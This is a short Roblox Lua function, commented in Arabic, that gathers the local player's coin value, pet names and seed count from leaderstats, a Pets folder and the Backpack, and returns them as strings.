local function getInventoryData()
    local data = {coins = "0", pets = "None", seeds = "0"}
    local LocalPlayer = game.Players.LocalPlayer
    
    -- جلب الكوينات
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        for _, val in pairs(leaderstats:GetChildren()) do
            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
                data.coins = tostring(val.Value)
            end
        end
    end
    
    -- جلب الحيوانات
    local petsFolder = LocalPlayer:FindFirstChild("Pets") 
    if petsFolder then
        local petNames = {}
        for _, pet in pairs(petsFolder:GetChildren()) do
            table.insert(petNames, pet.Name)
        end
        if #petNames > 0 then data.pets = table.concat(petNames, ", ") end
    end
    
    -- جلب البذور
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        local seedCount = 0
        for _, item in pairs(backpack:GetChildren()) do
            if string.find(string.lower(item.Name), "seed") then seedCount = seedCount + 1 end
        end
        data.seeds = tostring(seedCount)
    end
    return data
end

